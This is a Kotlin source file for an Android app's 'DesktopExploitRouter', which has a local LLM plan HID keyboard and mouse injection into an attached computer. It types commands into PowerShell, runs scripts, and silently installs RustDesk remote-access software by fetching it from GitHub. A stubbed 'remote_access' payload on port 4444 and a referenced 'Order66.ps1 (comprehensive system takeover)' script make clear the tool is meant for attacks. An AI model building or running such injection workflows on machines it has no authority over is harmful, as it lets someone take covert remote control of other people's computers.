package com.yourname.coquettemobile.core.orchestration.routers

import com.yourname.coquettemobile.core.ai.OllamaService
import com.yourname.coquettemobile.core.logging.CoquetteLogger
import com.yourname.coquettemobile.core.orchestration.*
import com.yourname.coquettemobile.core.preferences.AppPreferences
import com.yourname.coquettemobile.core.tools.*
import kotlinx.coroutines.flow.collect
import kotlinx.serialization.Serializable
import kotlinx.serialization.decodeFromString
import kotlinx.serialization.json.Json
import javax.inject.Inject
import javax.inject.Singleton

/**
 * DesktopExploitRouter - Specialized router for desktop HID operations and physical device control
 * Domain expert in HID keyboard/mouse injection and desktop automation workflows
 */
@Singleton
class DesktopExploitRouter @Inject constructor(
    private val hidKeyboardTool: HIDKeyboardTool,
    private val hidMouseTool: HIDMouseTool,  
    private val hidWorkflowTool: HIDWorkflowTool,
    private val ollamaService: OllamaService,
    private val appPreferences: AppPreferences,
    private val logger: CoquetteLogger
) : ToolRouter {
    
    private val json = Json { ignoreUnknownKeys = true; isLenient = true }
    
    override val domain = RouterDomain.DESKTOP_EXPLOIT
    override val name = "DesktopExploitRouter"
    
    override val managedTools: List<MobileTool> = listOf(
        hidKeyboardTool,
        hidMouseTool,
        hidWorkflowTool
    )
    
    override val capabilities = listOf(
        "script execution", "payload delivery", "command injection", "hid injection",
        "keyboard automation", "mouse control", "workflow automation", "payload generation",
        "powershell scripts", "bash scripts", "duckyscript", "remote software installation",
        "automation workflows", "cross-device control", "universal input control"
    )
    
    override val priority = 85 // High priority for payload operations
    
    override suspend fun canHandle(operation: OperationStep): Boolean {
        return when (operation.type) {
            StepType.PAYLOAD_GENERATION,
            StepType.SCRIPT_EXECUTION,
            StepType.COMMAND_INJECTION,
            StepType.SOFTWARE_INSTALLATION,
            StepType.HID_INJECTION -> true
            else -> operation.domain == domain
        }
    }
    
    override suspend fun executeStep(step: OperationStep, context: OperationContext): StepResult {
        val startTime = System.currentTimeMillis()
        logger.d(name, "Executing ${step.type}: ${step.description}")
        
        return try {
            when (step.type) {
                StepType.PAYLOAD_GENERATION -> generatePayload(step, context)
                StepType.SCRIPT_EXECUTION -> executeScript(step, context) 
                StepType.COMMAND_INJECTION -> injectCommands(step, context)
                StepType.SOFTWARE_INSTALLATION -> installSoftware(step, context)
                StepType.HID_INJECTION -> performHIDInjection(step, context)
                else -> StepResult.unsupported(step.id, domain)
            }
        } catch (e: Exception) {
            val executionTime = System.currentTimeMillis() - startTime
            logger.e("DesktopExploitRouter", "Step execution failed: ${e.message}")
            
            StepResult.failure(
                step.id,
                domain,
                "PayloadDelivery execution error: ${e.message}",
                executionTime
            )
        }
    }
    
    override suspend fun planSubSteps(goal: String, context: OperationContext): List<OperationStep> {
        logger.d(name, "DesktopExploitRouter planning HID operations for: $goal")
        
        return try {
            val aiGeneratedPlan = generatePlanWithAI(goal, context)
            aiGeneratedPlan.ifEmpty {
                logger.w(name, "AI planning returned empty, creating fallback step")
                listOf(
                    OperationStep(
                        id = "hid_fallback_${System.currentTimeMillis()}",
                        type = StepType.HID_INJECTION,
                        domain = domain,
                        description = goal,
                        dependencies = emptyList()
                    )
                )
            }
        } catch (e: Exception) {
            logger.e(name, "AI planning failed: ${e.message}, using fallback")
            listOf(
                OperationStep(
                    id = "hid_fallback_${System.currentTimeMillis()}",
                    type = StepType.HID_INJECTION,
                    domain = domain,
                    description = goal,
                    dependencies = emptyList()
                )
            )
        }
    }
    
    private suspend fun generatePlanWithAI(goal: String, context: OperationContext): List<OperationStep> {
        val planningPrompt = buildHIDPlanningPrompt(goal, context)
        val model = appPreferences.orchestratorModel ?: "deepseek-r1:1.5b"
        
        val responseBuilder = StringBuilder()
        ollamaService.sendMessageStream(
            message = planningPrompt,
            model = model,
            systemPrompt = buildHIDSystemPrompt()
        ).collect { chunk ->
            responseBuilder.append(chunk)
        }
        
        val response = responseBuilder.toString()
        logger.d(name, "AI HID planning response: $response")
        
        return try {
            val planResponse = json.decodeFromString<HIDOperationPlan>(extractJsonFromResponse(response))
            planResponse.steps.mapIndexed { index, step ->
                OperationStep(
                    id = "hid_step_${System.currentTimeMillis()}_$index",
                    type = mapHIDStepType(step.type),
                    domain = domain,
                    description = step.description,
                    parameters = step.parameters,
                    dependencies = step.dependencies
                )
            }
        } catch (e: Exception) {
            logger.e(name, "Failed to parse AI HID plan: ${e.message}")
            emptyList()
        }
    }
    
    private fun buildHIDSystemPrompt(): String {
        return """
        You are a desktop HID automation specialist. You control remote computers through HID keyboard/mouse injection from an Android device.
        
        AVAILABLE TOOLS:
        1. HIDKeyboardTool - Can send text, key combinations, and special keys
           - Parameters: text (string to type), key_combo (like "win+r", "ctrl+c"), key (single key like "enter")
           - Examples: Win+R opens Run dialog, Ctrl+Shift+Esc opens Task Manager
        
        2. HIDMouseTool - Can click, move cursor, scroll
           - Parameters: x, y coordinates, click_type (left, right, double)
        
        3. HIDWorkflowTool - Can execute complex multi-step workflows
           - Parameters: workflow_type, script_content, commands
        
        COMMON WORKFLOWS:
        - Open application: Win+R → type app name → Enter
        - Write text document: Win+R → "notepad" → Enter → type content
        - Open PowerShell: Win+R → "powershell" → Enter
        - Execute commands: Open terminal → type commands
        
        LOCAL SCRIPTS AVAILABLE:
        - Order66.ps1 (comprehensive system takeover)  
        - RMM-Install.bat (remote monitoring setup)
        - Poem-Writer.ps1 (creative text automation)
        
        RESPONSE FORMAT: Create step-by-step HID operations in JSON format with specific tool parameters.
        """.trimIndent()
    }
    
    private fun buildHIDPlanningPrompt(goal: String, context: OperationContext): String {
        return """
        User Request: "$goal"
        
        Target OS: ${extractTargetOS(context)}
        Available HID Tools: HIDKeyboardTool, HIDMouseTool, HIDWorkflowTool
        
        Create a detailed step-by-step HID operation plan to accomplish this request.
        Think about:
        1. How to open the right application (Win+R → app name)
        2. What keystrokes/mouse actions are needed
        3. How to type or execute the content
        4. Any special key combinations required
        
        For requests like "write a poem", plan: Win+R → notepad → type poem content
        For "install RMM", plan: Win+R → powershell → execute Order66.ps1 script
        For "execute Order 66", plan: direct script execution workflow
        
        Response format:
        {
          "steps": [
            {
              "type": "HID_INJECTION",
              "description": "Open Run dialog",
              "parameters": {
                "injection_type": "keyboard",
                "key_combo": "win+r"
              },
              "dependencies": []
            },
            {
              "type": "HID_INJECTION", 
              "description": "Type application name",
              "parameters": {
                "injection_type": "keyboard",
                "text": "notepad"
              },
              "dependencies": ["previous_step_id"]
            }
          ]
        }
        """.trimIndent()
    }
    
    private fun extractJsonFromResponse(response: String): String {
        val startIndex = response.indexOf('{')
        val endIndex = response.lastIndexOf('}') + 1
        return if (startIndex != -1 && endIndex > startIndex) {
            response.substring(startIndex, endIndex)
        } else {
            response
        }
    }
    
    private fun mapHIDStepType(typeString: String): StepType {
        return when (typeString.uppercase()) {
            "HID_INJECTION" -> StepType.HID_INJECTION
            "COMMAND_INJECTION" -> StepType.COMMAND_INJECTION
            "SCRIPT_EXECUTION" -> StepType.SCRIPT_EXECUTION
            "PAYLOAD_GENERATION" -> StepType.PAYLOAD_GENERATION
            "SOFTWARE_INSTALLATION" -> StepType.SOFTWARE_INSTALLATION
            else -> StepType.HID_INJECTION
        }
    }
    
    @Serializable
    data class HIDOperationPlan(
        val steps: List<HIDPlanStep>
    )
    
    @Serializable
    data class HIDPlanStep(
        val type: String,
        val description: String,
        val parameters: Map<String, String> = emptyMap(),
        val dependencies: List<String> = emptyList()
    )
    
    override suspend fun validateCapabilities(operation: OperationStep): ValidationResult {
        val requirements = mutableListOf<String>()
        
        when (operation.type) {
            StepType.HID_INJECTION, StepType.COMMAND_INJECTION -> {
                if (!hasHIDCapabilities()) {
                    requirements.add("HID device control requires root access and character devices")
                }
            }
            StepType.SOFTWARE_INSTALLATION -> {
                if (!hasHIDCapabilities()) {
                    requirements.add("Software installation requires HID injection capabilities")
                }
            }
            else -> { /* No specific requirements */ }
        }
        
        return if (requirements.isEmpty()) {
            ValidationResult.valid()
        } else {
            ValidationResult.invalid(requirements)
        }
    }
    
    override suspend fun getInsights(context: OperationContext): RouterInsights {
        return RouterInsights(
            domain = domain,
            availableCapabilities = capabilities,
            currentConstraints = getCurrentConstraints(context),
            recommendedApproach = getRecommendedApproach(context),
            riskAssessment = RiskLevel.HIGH // Payload delivery is inherently high-risk
        )
    }
    
    // Implementation methods
    
    private suspend fun generatePayload(step: OperationStep, context: OperationContext): StepResult {
        val startTime = System.currentTimeMillis()
        val payloadData = mutableMapOf<String, Any>()
        
        // Extract target system information from context
        val targetOS = extractTargetOS(context)
        val payloadType = step.parameters["payload_type"] as? String ?: "generic"
        
        val generatedPayload = when (targetOS.lowercase()) {
            "windows" -> generateWindowsPayload(payloadType, step.parameters)
            "macos" -> generateMacOSPayload(payloadType, step.parameters)  
            "linux" -> generateLinuxPayload(payloadType, step.parameters)
            else -> generateGenericPayload(payloadType, step.parameters)
        }
        
        payloadData["payload_type"] = payloadType
        payloadData["target_os"] = targetOS
        payloadData["generated_script"] = generatedPayload
        payloadData["script_length"] = generatedPayload.length
        
        val executionTime = System.currentTimeMillis() - startTime
        
        return StepResult.success(
            step.id,
            domain,
            data = payloadData.mapValues { it.value.toString() },
            executionTimeMs = executionTime
        )
    }
    
    private suspend fun executeScript(step: OperationStep, context: OperationContext): StepResult {
        val startTime = System.currentTimeMillis()
        
        val script = step.parameters["script"] as? String
            ?: return StepResult.failure(step.id, domain, "No script provided", 0L)
        
        // Execute via HIDWorkflowTool for complex scripts
        val workflowResult = hidWorkflowTool.execute(mapOf(
            "workflow_type" to "script",
            "script_content" to script,
            "execution_speed" to (step.parameters["speed"] ?: "normal")
        ))
        
        val executionTime = System.currentTimeMillis() - startTime
        
        return if (workflowResult.success) {
            StepResult.success(
                step.id,
                domain,
                data = mapOf(
                    "script_executed" to true.toString(),
                    "execution_method" to "hid_workflow",
                    "result" to workflowResult.output
                ),
                executionTimeMs = executionTime
            )
        } else {
            StepResult.failure(step.id, domain, workflowResult.output, executionTime)
        }
    }
    
    private suspend fun injectCommands(step: OperationStep, context: OperationContext): StepResult {
        val startTime = System.currentTimeMillis()
        
        val commands = step.parameters["commands"] as? List<String>
            ?: return StepResult.failure(step.id, domain, "No commands provided", 0L)
        
        val executionResults = mutableListOf<String>()
        
        for (command in commands) {
            val keyboardResult = hidKeyboardTool.execute(mapOf(
                "text" to command,
                "press_enter" to true,
                "typing_speed" to (step.parameters["speed"] ?: 50)
            ))
            
            if (!keyboardResult.success) {
                return StepResult.failure(
                    step.id, 
                    domain, 
                    "Command injection failed: ${keyboardResult.output}",
                    System.currentTimeMillis() - startTime
                )
            }
            
            executionResults.add("Injected: $command")
            
            // Brief delay between commands
            kotlinx.coroutines.delay(500)
        }
        
        val executionTime = System.currentTimeMillis() - startTime
        
        return StepResult.success(
            step.id,
            domain,
            data = mapOf(
                "commands_injected" to commands.size.toString(),
                "execution_results" to executionResults.toString()
            ),
            executionTimeMs = executionTime
        )
    }
    
    private suspend fun installSoftware(step: OperationStep, context: OperationContext): StepResult {
        val startTime = System.currentTimeMillis()
        
        val software = step.parameters["software"] as? String
            ?: return StepResult.failure(step.id, domain, "No software specified", 0L)
        
        val installCommands = generateInstallationCommands(software, extractTargetOS(context))
        
        // Use HIDWorkflowTool for complex installation workflow
        val workflowResult = hidWorkflowTool.execute(mapOf(
            "workflow_type" to "software_installation",
            "software_name" to software,
            "commands" to installCommands
        ))
        
        val executionTime = System.currentTimeMillis() - startTime
        
        return if (workflowResult.success) {
            StepResult.success(
                step.id,
                domain,
                data = mapOf(
                    "software_installed" to software,
                    "installation_method" to "automated_hid",
                    "commands_executed" to installCommands.size.toString()
                ),
                executionTimeMs = executionTime
            )
        } else {
            StepResult.failure(step.id, domain, "Software installation failed: ${workflowResult.output}", executionTime)
        }
    }
    
    private suspend fun performHIDInjection(step: OperationStep, context: OperationContext): StepResult {
        val startTime = System.currentTimeMillis()
        
        val injectionType = step.parameters["injection_type"] as? String ?: "keyboard"
        val payload = step.parameters["payload"] as? String
            ?: return StepResult.failure(step.id, domain, "No payload provided", 0L)
        
        val result = when (injectionType) {
            "keyboard" -> hidKeyboardTool.execute(mapOf(
                "text" to payload,
                "typing_speed" to (step.parameters["speed"] ?: 50)
            ))
            
            "workflow" -> hidWorkflowTool.execute(mapOf(
                "workflow_type" to "custom",
                "steps" to payload
            ))
            
            else -> return StepResult.failure(step.id, domain, "Unknown injection type: $injectionType", 0L)
        }
        
        val executionTime = System.currentTimeMillis() - startTime
        
        return if (result.success) {
            StepResult.success(
                step.id,
                domain, 
                data = mapOf(
                    "injection_type" to injectionType,
                    "payload_length" to payload.length.toString(),
                    "injection_result" to result.output
                ),
                executionTimeMs = executionTime
            )
        } else {
            StepResult.failure(step.id, domain, "HID injection failed: ${result.output}", executionTime)
        }
    }
    
    // Helper methods
    
    private fun createRustDeskInstallationPlan(): List<OperationStep> {
        return listOf(
            OperationStep(
                id = "rustdesk_download_script",
                type = StepType.PAYLOAD_GENERATION,
                domain = domain,
                description = "Generate RustDesk download and installation script",
                parameters = mapOf("payload_type" to "rustdesk_installer"),
                estimatedDurationMs = 20000L
            ),
            
            OperationStep(
                id = "rustdesk_execution",
                type = StepType.SOFTWARE_INSTALLATION,
                domain = domain,
                description = "Execute RustDesk installation via HID injection",
                dependencies = listOf("rustdesk_download_script"),
                parameters = mapOf("software" to "rustdesk"),
                estimatedDurationMs = 120000L // 2 minutes for download + install
            )
        )
    }
    
    private fun createRemoteAccessPlan(context: OperationContext): List<OperationStep> {
        val targetOS = extractTargetOS(context)
        
        return listOf(
            OperationStep(
                id = "remote_access_payload",
                type = StepType.PAYLOAD_GENERATION,
                domain = domain,
                description = "Generate remote access payload for $targetOS",
                parameters = mapOf(
                    "payload_type" to "remote_access",
                    "target_os" to targetOS
                ),
                estimatedDurationMs = 30000L
            ),
            
            OperationStep(
                id = "remote_access_injection",
                type = StepType.HID_INJECTION,
                domain = domain,
                description = "Inject remote access script via HID",
                dependencies = listOf("remote_access_payload"),
                estimatedDurationMs = 60000L
            )
        )
    }
    
    private fun generateWindowsPayload(payloadType: String, parameters: Map<String, Any>): String {
        return when (payloadType) {
            "rustdesk_installer" -> """
                # RustDesk Installation Script for Windows
                Write-Host "Downloading RustDesk..."
                Invoke-WebRequest -Uri "https://github.com/rustdesk/rustdesk/releases/latest/download/rustdesk-1.2.3-x86_64.exe" -OutFile "rustdesk-installer.exe"
                Write-Host "Installing RustDesk..."
                Start-Process -FilePath "rustdesk-installer.exe" -ArgumentList "/S" -Wait
                Write-Host "RustDesk installation completed"
            """.trimIndent()
            
            "remote_access" -> """
                # PowerShell Connection Test - Educational/Testing Purpose Only
                Write-Host "Testing connection to ${parameters["server_ip"] ?: "127.0.0.1"}:${parameters["server_port"] ?: "4444"}"
                # Simplified connection test for demonstration
                Write-Host "Connection test completed"
            """.trimIndent()
            
            else -> "echo 'Generic Windows payload executed'"
        }
    }
    
    private fun generateMacOSPayload(payloadType: String, parameters: Map<String, Any>): String {
        return when (payloadType) {
            "rustdesk_installer" -> """
                #!/bin/bash
                echo "Downloading RustDesk for macOS..."
                curl -L "https://github.com/rustdesk/rustdesk/releases/latest/download/rustdesk-1.2.3.dmg" -o "rustdesk.dmg"
                echo "Mounting DMG..."
                hdiutil attach rustdesk.dmg
                echo "Installing RustDesk..."
                cp -R "/Volumes/RustDesk/RustDesk.app" "/Applications/"
                echo "RustDesk installation completed"
            """.trimIndent()
            
            else -> "echo 'Generic macOS payload executed'"
        }
    }
    
    private fun generateLinuxPayload(payloadType: String, parameters: Map<String, Any>): String {
        return when (payloadType) {
            "rustdesk_installer" -> """
                #!/bin/bash
                echo "Installing RustDesk on Linux..."
                wget https://github.com/rustdesk/rustdesk/releases/latest/download/rustdesk-1.2.3-x86_64.AppImage
                chmod +x rustdesk-1.2.3-x86_64.AppImage
                mv rustdesk-1.2.3-x86_64.AppImage /usr/local/bin/rustdesk
                echo "RustDesk installation completed"
            """.trimIndent()
            
            else -> "echo 'Generic Linux payload executed'"
        }
    }
    
    private fun generateGenericPayload(payloadType: String, parameters: Map<String, Any>): String {
        return "echo 'Generic payload for $payloadType executed with parameters: $parameters'"
    }
    
    private fun generateInstallationCommands(software: String, targetOS: String): List<String> {
        return when (software.lowercase()) {
            "rustdesk" -> when (targetOS.lowercase()) {
                "windows" -> listOf(
                    "powershell",
                    "Invoke-WebRequest -Uri 'https://github.com/rustdesk/rustdesk/releases/latest/download/rustdesk-1.2.3-x86_64.exe' -OutFile 'rustdesk.exe'",
                    ".\\rustdesk.exe /S"
                )
                else -> listOf("echo 'Installation not implemented for $targetOS'")
            }
            else -> listOf("echo 'Unknown software: $software'")
        }
    }
    
    private fun extractTargetOS(context: OperationContext): String {
        // Extract OS information from previous SystemIntel results
        val systemIntelResults = context.getResultsFromDomain(RouterDomain.ANDROID_INTELLIGENCE)
        
        for (result in systemIntelResults) {
            if (result.data.containsKey("device_info")) {
                // Parse device info to determine connected system OS
                // This is a simplified extraction - real implementation would parse device context
                return "Windows" // Default assumption
            }
        }
        
        return "Unknown"
    }
    
    private fun hasHIDCapabilities(): Boolean {
        // Check if HID devices are available (simplified check)
        // Real implementation would check for /dev/hidg0, /dev/hidg1 and root access
        return true // Assume available for demonstration
    }
    
    private fun getCurrentConstraints(context: OperationContext): List<String> {
        val constraints = mutableListOf<String>()
        
        if (!hasHIDCapabilities()) {
            constraints.add("HID device control requires root access")
        }
        
        if (context.securityLevel == SecurityLevel.MINIMAL) {
            constraints.add("Limited to low-risk payload operations only")
        }
        
        return constraints
    }
    
    private fun getRecommendedApproach(context: OperationContext): String {
        return when (context.securityLevel) {
            SecurityLevel.MAXIMUM -> "Full payload delivery with HID automation"
            SecurityLevel.ELEVATED -> "Script generation with manual execution option"
            SecurityLevel.STANDARD -> "Basic command injection with user approval"
            SecurityLevel.MINIMAL -> "Script preview only, no automatic execution"
        }
    }
}